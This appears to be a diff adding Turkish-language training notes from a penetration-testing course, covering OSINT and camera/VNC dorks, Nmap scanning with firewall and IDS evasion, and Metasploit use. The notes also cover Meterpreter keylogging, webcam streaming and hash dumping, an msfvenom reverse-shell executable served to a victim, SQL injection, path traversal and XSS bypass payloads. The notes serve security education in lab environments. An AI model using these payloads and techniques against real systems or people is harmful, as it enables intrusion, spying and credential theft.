@@ -1,0 +1,285 @@
+🛡️ SİBER VATAN YÜZ YÜZE EĞİTİM NOTLARI
+Hazırlayan: Kader BERGE
+
+Kapsam: Bilgi Toplama, Tarama, Sızma Testleri, Post-Exploitation ve Web Zafiyetleri
+
+📌 DERS 1: OSINT ve Pasif/Aktif Bilgi Toplama (Keşif Notları)
+Sızma testlerinin ilk ve en önemli aşaması hedef hakkında bilgi toplamaktır. Bu derste açık kaynak istihbaratı (OSINT) ve ağ üzerindeki açık cihazların tespiti üzerinde durulmuştur.
+
+1. Arama Motoru Keşifleri ve Bilgi Toplama Araçları
+Google Dorking / Google Hacking: Arama motorlarının gelişmiş parametrelerini kullanarak web sitelerindeki hassas dosyaları, açık dizinleri veya yönetici panellerini bulma tekniğidir.
+
+Örnek Kullanım: filetype:xsl "username | password" site:.il (Hassas verileri barındıran xsl dosyalarını arar).
+
+Google Hacking Database (GHDB): Exploit-DB üzerinde yer alan, siber güvenlik araştırmacılarının keşfettiği hazır ve güncel Google dork listesidir.
+
+Web-Check (https://web-check.xyz): Hedef web sitesinin mimarisini, IP adreslerini, DNS kayıtlarını ve bağlantılı olduğu diğer siteleri tek ekranda analiz eden araç.
+
+RocketReach (rocketreach.co): Hedef şirkette çalışan personellerin e-posta adreslerini ve iletişim bilgilerini bulmaya yarayan OSINT aracı.
+
+Tinfoleak (tinfoleak.com): Twitter (X) hesapları üzerinde detaylı analiz ve bilgi toplama yapan araç.
+
+ExifMeta (exifmeta.com): Görsellerin içerisindeki gizli meta verileri (çekildiği konum, kamera modeli, tarih vb.) analiz eden araç.
+
+Have I Been Pwned (haveibeenpwned.com): Bir e-posta adresinin veya parolanın daha önce sızdırılmış veri tabanlarında yer alıp almadığını kontrol eden servis.
+
+Temp Mail (temp-mail.org/tr): Bilgi toplama veya test aşamalarında geçici/kullan-at e-posta adresi oluşturan servis.
+
+Fake Mail Sender (tools.apgy.in/tool/fake-email-sender): Kimlik avı (Phishing) simülasyonları için sahte e-posta gönderim aracı.
+
+2. Alt Alan Adı (Subdomain) ve Altyapı Analizi
+Subfinder: Bir alan adına ait alt alan adlarını (subdomain) hızlıca bulan komut satırı aracı.
+
+Kullanım: subfinder -d sibervatan.org
+
+Pentest-Tools Subdomain Finder: Çevrimiçi ortamda çalışan hızlı subdomain tespit aracı.
+
+SecurityTrails: Gelişmiş domain ve DNS geçmişi analizi sunan platform.
+
+Urlscan.io: Bir web sitesine gitmeden arka planda sitenin güvenlik analizini ve ekran görüntüsünü alan servis.
+
+Wappalyzer: Web sitelerinin hangi teknolojileri, CMS sistemlerini ve kütüphaneleri kullandığını gösteren tarayıcı eklentisi.
+
+Cyrops (cyrops.com): Siber tehdit istihbaratı ve analiz platformu.
+
+Wayback Machine (Archive.org): Web sitelerinin geçmiş yıllardaki hallerini ve arşivlenmiş eski sayfalarını gösteren dijital arşiv.
+
+3. IoT ve Ağ Keşif Motorları (Açık Kameralar ve Cihazlar)
+Shodan: İnternete bağlı tüm akıllı cihazları (kamera, sunucu, IoT, yazıcı vb.) tarayan arama motoru.
+
+Dork Örneği: http.title:"Blue Iris Remote View" CAMERA "shodan" (Açık Blue Iris kameraları listeler).
+
+Insecam (insecam.org): Dünya genelinde şifresi değiştirilmemiş veya varsayılan şifrede bırakılmış güvenlik kameralarını canlı yayınlayan site.
+
+Censys (censys.com): İnternete açık cihazlar, sertifikalar ve ağ yapılandırmaları hakkında detaylı bilgi sunan arama motoru.
+
+Ağ Bağlantılı Cihaz Keşifleri:
+
+intitle:"EvoCam" inurl:"webcam.html" (EvoCam zafiyetli kameraları bulma dorku).
+
+HP Laser MFP Yazıcılar: Shodan üzerinde açık IP ve portlar üzerinden korumasız yazıcı panellerine erişim sağlanabilir.
+
+VNC Viewer: port:5900 RFB authentication disabled (Şifre doğrulaması devre dışı bırakılmış VNC uzak masaüstü bağlantıları) tespiti yapıldıktan sonra kurban bilgisayara bağlanmak için kullanılan araç.
+
+4. Ağ ve DNS Sorgu Komutları
+Whois: Bir alan adının kime ait olduğunu, tescil ve bitiş tarihlerini sorgular.
+
+Nslookup: Alan adlarının IP adresini çıkarır ve DNS kayıtları hakkında bilgi verir.
+
+DNSChecker (dnschecker.org): Bir domainin dünya genelindeki farklı DNS sunucularındaki kayıtlarını doğrular.
+
+ViewDNS (viewdns.info): Tek bir IP üzerinde barınan diğer siteleri (Reverse IP Lookup) ve DNS verilerini analiz eden araç kutusu.
+
+Traceroute: Bilgisayarınızdan çıkan bir paketin hedef sunucuya varana kadar ağ üzerinde hangi yönlendiricilerden (hop) geçtiğini gösterir.
+
+IPinfo (ipinfo.io): Kullanılan IP adresinin coğrafi konumunu, ISP (İnternet Servis Sağlayıcı) bilgisini gösteren servis.
+
+🔍 DERS 2: Ağ Tarama ve Güvenlik Duvarı Atlatma (Nmap Notları)
+Bu aşamada aktif tarama yapılarak hedef ağdaki canlı cihazlar, açık portlar, çalışan servisler ve işletim sistemleri tespit edilir.
+
+1. Ağdaki Cihazları Keşfetme (Host Discovery)
+Fing: Mobil ve masaüstünde ağa bağlı olan diğer cihazları tespit eden uygulama.
+
+Netdiscover: Yerel ağda (LAN) ARP istekleri göndererek canlı cihazları ve MAC adreslerini bulan araç.
+
+Kullanım: netdiscover -r 192.168.1.0/24
+
+İç Ağ Bilgisi Öğrenme: Linux üzerinde IP adresimizi öğrenmek için ifconfig veya ip a komutları kullanılır.
+
+2. Nmap Tarama Komutları ve Parametreleri
+Nmap, ağ taramasının "İsviçre Çakısı"dır. Temel mantığı: "Belediye binasının kapısının arkasında ne olduğunu görmektir."
+
+Temel Tarama: nmap <hedef_IP> (En yaygın 1000 portu tarar).
+
+Agresif Tarama (-A): İşletim sistemi tespiti, versiyon tespiti, script taraması ve traceroute işlemlerini bir arada yapar.
+
+Kullanım: nmap -A <hedef_IP>
+
+Hızlı Tarama (-F): Sadece en sık kullanılan 100 portu tarar.
+
+Birleşik Kullanım: nmap -F -A <hedef_IP> (En sık kullanılan 100 portta agresif analiz yapar).
+
+Belirli Sayıda Popüler Port Taraması: nmap --top-ports 50 <hedef_IP> (En popüler 50 portu tarar).
+
+Tüm Portları Tarama (-p-): 1'den 65535'e kadar olan tüm portları eksiksiz tarar.
+
+Versiyon Taraması (-sV): Açık portlarda çalışan servislerin tam versiyon bilgisini verir. Versiyon bilgisi üzerinden doğrudan CVE (Common Vulnerabilities and Exposures) zafiyet tespiti yapılabilir.
+
+İşletim Sistemi Tespiti (-O): Hedef cihazın hangi işletim sistemini (Windows/Linux) kullandığını tahmin eder.
+
+Ping Taraması (-sP veya -sn): Port taraması yapmadan sadece ağda hangi cihazların açık (canlı) olduğunu tespit eder.
+
+TCP SYN (Yarı Açık) Taraması (-sS): Bağlantıyı tam olarak tamamlamadığı için gizli tarama olarak bilinir. (Sudo yetkisi gerektirir).
+
+UDP Taraması (-sU): UDP protokolü kullanan portları tarar.
+
+Tarama Hız Ayarı (-T[0-5]): Tarama hızını belirler. T4 ve T5 hızlıyken, T1 ve T2 güvenlik duvarlarına yakalanmamak için yavaş (sinsi) çalışır.
+
+Çıktıyı Dosyaya Kaydetme: Taramayı bir metin dosyasına yazdırmak için kullanılır:
+
+Kullanım: nmap <hedef_IP> > output.txt
+
+3. Güvenlik Duvarı (Firewall/IDS) Atlatma Teknikleri
+Güvenlik duvarları (Firewall) ağa giren ve çıkan trafiği izler. Bu sistemleri atlatmak için Nmap parametreleri optimize edilir:
+
+Paket Parçalama (-f): Gönderilen ağ paketlerini küçük parçalara bölerek güvenlik duvarının (IDS/IPS) paketi analiz etmesini zorlaştırır.
+
+Kullanım: nmap -sS -f <hedef_IP>
+
+Yemleme / Sahte IP Kullanma (-D): Taramayı yaparken ağa sahte IP adresleri (yem) fırlatır. Güvenlik duvarı loglarında gerçek saldırgan IP'si yüzlerce sahte IP arasında gizlenir (Yemekhane örneği: Herkes sıraya girer ama yemeği kimin aldığı belli olmaz).
+
+Kullanım: nmap -D sahteIP1,sahteIP2,MEGE <hedef_IP>
+
+Tor Ağı Üzerinden Tarama: Kimliği gizlemek için sudo apt install torbrowser-launcher -y ile Tor kurulur ve proxy zincirleri üzerinden tarama yapılabilir.
+
+4. Parola Kırma Hazırlığı
+CUPP (cupp -i): Hedef kişiye özel (adı, soyadı, doğum tarihi, evcil hayvanı vb.) bilgileri toplayarak kişiselleştirilmiş wordlist (parola listesi) oluşturan araç.
+
+1337 (Leet Alfabesi): Harflerin sayılarla değiştirilmesi mantığıdır (Örn: kader -> k4d3r). CUPP ve parola kırıcılar bu kombinasyonları kullanır.
+
+💥 DERS 3: Ağ ve Sistem Sızma Testleri (Metasploit Framework)
+Hedef sistemdeki zafiyetler tespit edildikten sonra, sisteme sızmak ve yetki elde etmek için Metasploit Framework (msfconsole) kullanılır. Bu laboratuvarda zafiyetli makineler barındıran Vulnhub ekosistemi simüle edilmiştir.
+
+1. Metasploit Temel Arama ve Modül Seçimi
+msfconsole: Metasploit konsolunu başlatır.
+
+search httpd: Apache veya diğer HTTP servislerine ait exploitleri arar.
+
+search type:exploit platform:windows smb: Sadece Windows işletim sistemindeki SMB zafiyetlerine yönelik exploitleri filtreler.
+
+use [modül_yolu]: Kullanılacak olan sömürü (exploit) veya yardımcı modülü seçer.
+
+options: Seçilen modülün çalışması için gerekli olan parametreleri (RHOST, LHOST vb.) listeler.
+
+show targets: Seçilen exploite uygun hedef işletim sistemi sürümlerini listeler.
+
+show advanced: Modüle ait gelişmiş/detaylı ince ayarları gösterir.
+
+back: Seçili modülden çıkarak ana menüye döner.
+
+2. Parametre Tanımlama ve Sömürü (Exploitation)
+set RHOSTS <hedef_IP> veya set RHOST <hedef_IP>: Kurban makinenin IP adresini tanımlar.
+
+check: Exploiti çalıştırmadan önce hedef makinenin bu zafiyete karşı gerçekten açık barındırıp barındırmadığını test eder.
+
+run veya exploit: Sömürü işlemini başlatır ve hedef sisteme sızmaya çalışır.
+
+3. Temel Meterpreter Komutları (İlk Erişim)
+Sızma işlemi başarılı olduğunda gelişmiş bir komut satırı olan Meterpreter oturumu açılır:
+
+sessions -i [id]: Arka planda duran veya farklı zafiyetlerden elde edilen oturumlar arasında geçiş yapmayı sağlar.
+
+getpid: Zararlı yazılımımızın (payload) kurban makinede o an hangi süreç (PID) numarası altında çalıştığını gösterir.
+
+getprivs: Mevcut oturumun sistem üzerinde hangi haklara ve yetkilere sahip olduğunu listeler.
+
+ps: Kurban bilgisayarda çalışan tüm güncel süreçleri listeler.
+
+kill [PID]: Hedef sistemde çalışan tehlikeli bir süreci veya antivirüsü kapatmak için kullanılır.
+
+Dosya İşlemleri:
+
+search -f *.doc: Kurban makinenin diskinde .doc uzantılı kritik belgeleri arar.
+
+upload /root/ornekdosya.doc c:\\: Kendi bilgisayarımızdaki bir dosyayı kurban makineye yükler.
+
+download c:\\windows\\system32\\cmd.exe .: Kurban makinedeki kritik bir dosyayı kendi bilgisayarımıza indirir.
+
+🚀 DERS 4: Sızma Sonrası İşlemler ve Zafiyet Tarama (Post-Exploitation & Nessus)
+Sisteme sızıldıktan sonra kalıcılık sağlama, bilgi sızdırma ve ağ içerisinde dikey/yatay hareket etme aşamasıdır.
+
+1. Meterpreter Post-Exploitation Komutları
+background: Mevcut Meterpreter oturumunu kapatmadan arka plana alır ve msfconsole ekranına döner.
+
+migrate [PID]: Aktif oturumu kurban makinede asla kapanmayacak olan kararlı bir sürecin (Örn: explorer.exe veya winlogon.exe) içine taşır. Bu sayede kullanıcı açık olan zararlı uygulamayı kapatsa bile bağlantımız kopmaz.
+
+Klavye Dinleme (Keylogging):
+
+keyscan_start: Kurbanın klavye hareketlerini kaydetmeye başlar.
+
+keyscan_dump: Kurbanın o ana kadar klavyede yazdığı kullanıcı adlarını, şifreleri ve mesajları ekrana getirir.
+
+Ağ ve Medya Sömürüsü:
+
+screenshot: Kurbanın o anki ekran görüntüsünü alır.
+
+webcam_stream: Kurbanın kamerasından canlı video akışı başlatır.
+
+Kimlik Bilgisi Sızdırma:
+
+hashdump: Sistemdeki kullanıcı şifrelerinin şifreli hallerini (SAM veritabanı hashlerini) çeker.
+
+search gather/hashdump: Metasploit içindeki diğer gelişmiş şifre toplama modüllerini arar.
+
+CrackStation (crackstation.net): Ele geçirilen şifre hash'lerini kırmak için kullanılan devasa online rainbow table (parola tablosu) veritabanı.
+
+2. MSFVenom ile Özel Exe Oluşturma ve Python Sunucusu
+Zararlı Yazılım Üretimi: Kurbanın tıklamasıyla bize tersine bağlantı (reverse_tcp) gönderecek bir ajan dosyası üretilir:
+
+Bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.30.128 LPORT=4444 -f exe > merhaba.exe
+Python HTTP Sunucusu: Üretilen merhaba.exe dosyasını kurbana indirtmek için Metasploit'e ihtiyaç duymadan hızlıca bir web sunucusu ayağa kaldırılır:
+
+Bash
+python3 -m http.server 80
+Kurban bilgisayardan tarayıcıya gidip http://<Saldırgan_IP> yazıldığında doğrudan bu dosyaya ulaşılır.
+
+3. Kurumsal Zafiyet Tarama Sistemi: Nessus
+Kurulum: İndirilen Nessus paketi kurulur: dpkg -i Nessus-...
+
+Servisi Başlatma: /etc/init.d/nessud start
+
+Erişim: Tarayıcı üzerinden https://localhost:8834 veya http://localhost:8834 adreslerinden yönetim paneline gidilerek kurumsal ağ taramaları gerçekleştirilir.
+
+🌐 DERS 5: Web Uygulama Güvenliği ve Web Zafiyetleri (OWASP Top 10)
+Bu derste, Hackviser laboratuvar ortamlarında (*.hackviser.space) yer alan web uygulamaları üzerindeki kritik zafiyetler uygulamalı olarak sömürülmüştür.
+
+1. SQL Injection (SQL Enjeksiyonu) ile Kimlik Doğrulama Bypass
+Giriş formlarında girdilerin filtrelenmemesi sonucu veritabanına doğrudan müdahale edilmesidir.
+
+Uygulama Alanı: https://devoted-kitty.europe1.hackviser.space
+
+Sömürü: Kullanıcı adı alanına isim' OR 1=1# yazıldığında, arka plandaki SQL sorgusu mantıksal olarak her zaman doğru (true) döner. # karakteri sorgunun şifre kontrolü yapan devam kısmını yorum satırı yaparak siler. Bu sayede şifre girmeden Admin olarak giriş yapılır.
+
+2. Path Traversal / Directory Traversal (Dizin Geçişi) & LFI
+Web sitesinin dosya çağırma parametreleri üzerinden sunucunun kök dizinlerine tırmanma zafiyetidir.
+
+Uygulama Alanı: https://first-shaman.europe1.hackviser.space
+
+Sömürü: URL parametresine veya dosya yoluna ../../../../../../etc/passwd yazılarak üst dizinlere çıkılır ve Linux sunucunun hassas kullanıcı listesi okunur.
+
+3. Cross-Site Scripting (XSS) ve Tarayıcı Sömürüsü (BeEF)
+Kullanıcı girdilerinin tarayıcı tarafından doğrudan bir JavaScript kodu olarak çalıştırılması zafiyetidir.
+
+Zafiyet Tespiti: Girdi alanlarına <script>alert(1)</script> veya prompt() kodları yazılarak tarayıcıda uyarı kutusu çıkıp çıkmadığı kontrol edilir.
+
+BeEF Framework (beef-xss): Açılımı Browser Exploitation Framework'tür. XSS zafiyeti olan sayfaya BeEF scripti gömüldüğünde, sayfayı ziyaret eden kurbanların tarayıcıları tamamen kontrol altına alınabilir.
+
+Filtre Atlatma (XSS Bypass): Eğer sistem <script> etiketlerini engelliyorsa veya kod bir çift tırnak (") içinde hapsedilmişse, HTML olay tetikleyicileri (Event Handlers) kullanılarak bypass edilir:
+
+HTML
+" onmouseover="alert(1)
+(Kullanıcı faresini o öğenin üzerine getirdiği an kod tetiklenir).
+
+4. Gelişmiş Komut Sömürüsü (Reverse Shell Payloads)
+Revshells (revshells.com): Web uygulamalarında kod çalıştırma (RCE) zafiyeti bulunduğunda, hedef sistemin türüne göre (Bash, Python, PHP, Netcat, Powershell) anlık olarak tersine bağlantı kodları üreten, sızma testlerinin en popüler web otomasyon aracıdır.
+
+🚩 Bölüm 6: CTF (Capture The Flag) Notları
+1. Gelişmiş OSINT ve Coğrafi Konum Tespiti
+•	Flightradar24 & ADS-B Exchange: Uçak kuyruk numaraları (Örn: tc-lsr) veya uçuş kodları üzerinden hava taşıtlarının canlı konumunu, rotasını ve uçuş geçmişini izlemeyi sağlar. CTF'lerde "Bu fotoğraf hangi uçaktan çekilmiştir?" tarzı sorularda ipucu yakalamak için kullanılır.
+•	What3Words (what3words.com): Dünya genelindeki her 3 metrekarelik alanı benzersiz 3 kelimeyle haritalandıran sistemdir. İstihbarat ve fiziksel keşif sorularında nokta atışı konum tespiti ve koordinat şifrelemesi için kullanılır.
+•	Intelligence (Gmail OSINT): Bir Gmail adresinin hangi Google servislerine (Maps, YouTube vb.) kayıtlı olduğunu, profil fotoğrafını ve sızdırılmış verilerini analiz eden e-posta istihbarat yöntemidir.
+2. Forensics (Adli Bilişim) ve Paket Analizi
+•	Apackets ([apackets.com/upload](https://apackets.com/upload)): Ağ trafiği sırasında yakalanan PCAP (paket) dosyalarını tarayıcı üzerinden yükleyerek görsel ve detaylı analiz etmeyi sağlayan online paket analiz (Analysis of Packets) aracıdır. Wireshark olmayan ortamlarda hayat kurtarır.
+•	StegOnline: Dijital fotoğrafların içerisine gizlenmiş verileri (Steganografi) ortaya çıkarmak için piksel analizi, renk kanalları (RGBA) ve gizli katman incelemesi yapan online adli bilişim aracıdır.
+•	OpenTheFile (openthefile.net): Analiz edilen ancak uzantısı bilinmeyen/bozuk olan dosyaların hangi programlarla açılabileceğini ve ne işe yaradığını gösteren dosya analiz kütüphanesidir.
+•	VirusTotal Topluluk Analizi: Şüpheli bir dosyanın SHA256 hash değeri üzerinden, siber güvenlik topluluğunun (community) o dosya hakkında yazdığı analiz notlarını ve zararlı davranış raporlarını inceleme adımıdır.
+3. Kriptoloji ve Şifre Çözücüler (Crypto)
+•	CyberChef: Siber güvenliğin "İsviçre Çakısı"dır. Veri dönüştürme, şifreleme/şifre çözme (Hex, Base64, URL, XOR vb.) işlemlerini görsel bir akış şemasıyla saniyeler içinde çözer.
+•	dCode (dcode.fr): İçerisinde yüzlerce farklı antik, klasik ve modern şifreleme algoritmasını (Sezar, Vigenere, Bacon vb.) barındıran gelişmiş şifre çözücü platformdur. CTF'lerin kriptoloji sorularında ilk duraktır.
+•	JWT.io: Web uygulamalarında kimlik doğrulama için kullanılan JSON Web Token (JWT) kodlarını çözerek (decode) içerisindeki gizli verileri, kullanıcı rollerini ve imza doğrulamalarını analiz eden araçtır.
+•	Morse Code Adaptive Audio Decoder: Ses dosyaları veya radyo sinyalleri içerisine gizlenmiş Mors kodlarını otomatik olarak dinleyip metne (flag formatına) dönüştüren ses çözücü araçtır.
+•	CrackStation: Sızdırılan şifreli hash verilerini (MD5, SHA1, SHA256 vb.) kırmak için kullanılan, milyarlarca kelimelik devasa gökkuşağı tabloları (rainbow tables) veritabanıdır.
+
+Not: Bu dokümanda yer alan tüm çalışmalar yasal laboratuvar ortamlarında eğitim ve test amacıyla gerçekleştirilmiştir.
+
